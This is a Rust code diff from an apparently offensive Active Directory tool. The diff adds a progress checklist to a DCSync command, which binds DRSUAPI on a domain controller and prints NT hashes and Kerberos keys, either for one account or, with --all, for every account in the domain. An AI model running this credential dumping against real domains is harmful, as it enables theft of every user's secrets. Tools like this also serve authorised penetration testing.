@@ -6,6 +6,8 @@
 use anyhow::Result;
 use clap::Parser;
 
+use crate::ui;
+
 #[derive(Parser)]
 pub(crate) struct DcsyncArgs {
     #[command(flatten)]
@@ -28,19 +30,57 @@ pub(crate) struct DcsyncArgs {
 }
 
 /// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
-pub(crate) async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
-    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
+///
+/// Rich per-stage checklist: password → SMB/DRSUAPI bind → replicate → output. Fails
+/// at each stage anchor `mark_current_failed` so a bad bind (creds/net) is clearly
+/// separated from a bad replication (target-doesn't-exist / access-denied).
+pub(crate) async fn dcsync(a: DcsyncArgs) -> Result<()> {
+    let stages = if a.all {
+        vec![
+            "resolve password",
+            "enumerate accounts (SAMR)",
+            "confirm bulk run",
+            "DRSUAPI bind",
+            "replicate all",
+        ]
+    } else {
+        vec!["resolve password", "DRSUAPI bind", "replicate target"]
+    };
+    let mut checklist = ui::StageChecklist::new(stages);
+    let result = dcsync_impl(a, &mut checklist).await;
+    match &result {
+        Ok(()) => checklist.render("DCSync stages"),
+        Err(e) => {
+            let brief = format!("{e:#}")
+                .lines()
+                .next()
+                .unwrap_or("failed")
+                .chars()
+                .take(80)
+                .collect::<String>();
+            checklist.mark_current_failed(brief);
+            checklist.render("DCSync stages (failed)");
+        }
+    }
+    result
+}
+
+async fn dcsync_impl(mut a: DcsyncArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     use ms_drsr::DrsSession;
+    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
+    checklist.record_ok("resolve password", "resolved");
 
     if a.all {
-        return dcsync_all(&a).await;
+        return dcsync_all(&a, checklist).await;
     }
     let mut sess =
         DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
+    checklist.record_ok("DRSUAPI bind", "sealed replication handle");
     match a.target {
         None => {
             let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
             println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
+            checklist.record_skipped("replicate target", "no --target set — bind-only check");
         }
         Some(t) => {
             let (rid, nt, kerb) = sess.dcsync(&a.auth.domain, &t).await?;
@@ -54,6 +94,10 @@ pub(crate) async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
             for k in &kerb {
                 println!("{}:{}:{}", t, k.etype_name(), hex::encode(&k.key));
             }
+            checklist.record_ok(
+                "replicate target",
+                format!("RID {rid} · NT hash + {} Kerberos key(s)", kerb.len()),
+            );
         }
     }
     Ok(())
@@ -62,7 +106,7 @@ pub(crate) async fn dcsync(mut a: DcsyncArgs) -> Result<()> {
 /// Full-domain DCSync: enumerate every account over SAMR, then replicate + decrypt each —
 /// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
 /// (which now reassembles multi-fragment replies, so large/computer accounts work too).
-async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
+async fn dcsync_all(a: &DcsyncArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
     use dcerpc::samr::SamrClient;
     use ms_drsr::DrsSession;
     use smb2_client::SmbClient;
@@ -78,6 +122,10 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
     let mut users = samr
         .enumerate_all_users(&format!("\\\\{}", a.auth.host))
         .await?;
+    checklist.record_ok(
+        "enumerate accounts (SAMR)",
+        format!("{} account(s)", users.len()),
+    );
 
     // Interactive-terminal safety gate. `--all` on a fat-fingered command dumps
     // every account in the domain; require --yes when we can see the operator's
@@ -91,6 +139,14 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
             a.auth.host
         );
     }
+    checklist.record_ok(
+        "confirm bulk run",
+        if a.yes {
+            "--yes"
+        } else {
+            "non-TTY (auto-confirmed)"
+        },
+    );
 
     if let Some(n) = a.limit {
         if users.len() > n {
@@ -107,6 +163,7 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
     // 2. DCSync each over one sealed DRSUAPI session.
     let mut sess =
         DrsSession::bind(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password).await?;
+    checklist.record_ok("DRSUAPI bind", "sealed replication handle");
     let (mut ok, mut fail) = (0u32, 0u32);
     for (_rid, name) in &users {
         match sess.dcsync(&a.auth.domain, name).await {
@@ -128,5 +185,6 @@ async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
         }
     }
     eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
+    checklist.record_ok("replicate all", format!("{ok} dumped · {fail} failed"));
     Ok(())
 }
